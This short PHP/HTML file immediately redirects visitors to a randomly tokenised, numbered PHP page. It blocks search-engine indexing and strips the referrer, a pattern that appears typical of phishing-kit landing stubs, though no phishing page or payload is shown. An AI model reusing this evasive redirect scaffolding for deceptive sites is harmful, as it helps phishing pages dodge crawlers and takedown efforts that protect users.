<?php
$md5 = md5(uniqid(time()));
$loc="index91484101498.php?".$md5;
?>
<html><head>
<meta name="robots" content="noindex, nofollow"/>
<meta name="referrer" content="no-referrer" />
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $loc; ?>">
<script type="text/javascript">
loc = "<?php echo $loc; ?>"
self.location.replace(loc);
window.location = loc;
</script>
</head>